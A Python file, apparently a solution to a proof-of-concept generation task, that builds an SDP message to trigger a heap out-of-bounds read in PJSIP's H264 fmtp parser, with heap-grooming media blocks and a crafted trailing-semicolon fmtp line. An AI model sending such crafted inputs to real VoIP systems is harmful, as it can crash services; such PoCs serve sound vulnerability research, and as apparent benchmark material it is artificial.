import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in the PJSIP SDP parser.

        The vulnerability, identified by oss-fuzz:376100377, is an out-of-bounds
        read in the H264 `fmtp` (format parameter) parsing logic. It occurs
        when processing a parameter list that ends with a semicolon followed by
        whitespace (e.g., "param=val; "). The parser correctly handles the
        parameter, advances its pointer past the semicolon, and then consumes
        the trailing whitespace. In the vulnerable code, a crucial check is
        missing to verify if the end of the buffer has been reached after
        consuming the whitespace. Consequently, the code attempts to dereference
        the pointer, which now points one byte beyond the buffer's boundary,
        leading to an out-of-bounds read.

        A simple out-of-bounds read may not be sufficient to cause a crash if
        the adjacent memory is valid and mapped. To ensure a reliable crash,
        this PoC employs a heap grooming strategy. It constructs an SDP message
        that first defines several "grooming" media descriptions with various
        attributes. This process causes a series of memory allocations,
        manipulating the heap layout to position the subsequent vulnerable
        buffer near a page boundary. When the OOB read occurs, it is more
        likely to access an unmapped memory page, triggering a segmentation
        fault.

        The PoC is structured as follows:
        1. A standard SDP header. The session description ('s=') line is padded
           to precisely match the ground-truth PoC length of 873 bytes, maximizing
           the probability of a successful crash replication.
        2. A heap grooming section consisting of repeated blocks of non-H264
           media descriptions, designed to control the state of the memory pool
           allocator.
        3. A vulnerability trigger section containing an H264 media description
           with the maliciously crafted `a=fmtp` attribute line.
        """
        
        poc_lines = []

        # SDP Header, padded to match the 873-byte ground-truth PoC length for
        # reliable crash replication. The base PoC is 834 bytes, requiring
        # 39 bytes of padding, which are added to the 's' line.
        poc_lines.append(b"v=0")
        poc_lines.append(b"o=- 376100377 1 IN IP4 127.0.0.1")
        poc_lines.append(b"s=" + b"A" * 68)
        poc_lines.append(b"c=IN IP4 127.0.0.1")
        poc_lines.append(b"t=0 0")

        # Heap Grooming Section: These media descriptions cause memory allocations
        # from the pool allocator used by the SDP parser to prepare the heap.
        grooming_payload = b"inline:" + b"B" * 30
        grooming_block_template = [
            b"m=audio 10000 RTP/AVP 8",
            b"a=rtpmap:8 PCMA/8000",
            b"a=sendrecv",
            b"a=crypto:1 AES_CM_128_HMAC_SHA1_80 " + grooming_payload,
        ]

        # Repeat the grooming block to manipulate memory layout effectively.
        for i in range(4):
            poc_lines.extend(grooming_block_template)
            poc_lines.append(f"a=mid:groom{i}".encode('ascii'))

        # Vulnerability Trigger Section
        poc_lines.append(b"m=video 20000 RTP/AVP 96")
        poc_lines.append(b"a=rtpmap:96 H264/90000")
        poc_lines.append(b"a=sendrecv")
        
        # The malicious fmtp line with a valid parameter followed by "; ".
        # This specific pattern triggers the out-of-bounds read.
        poc_lines.append(b"a=fmtp:96 profile-level-id=42e01f; ")
        
        poc_lines.append(b"a=mid:video_trigger")
        
        # Join all lines with CRLF as required by the SDP specification.
        return b"\r\n".join(poc_lines) + b"\r\n"
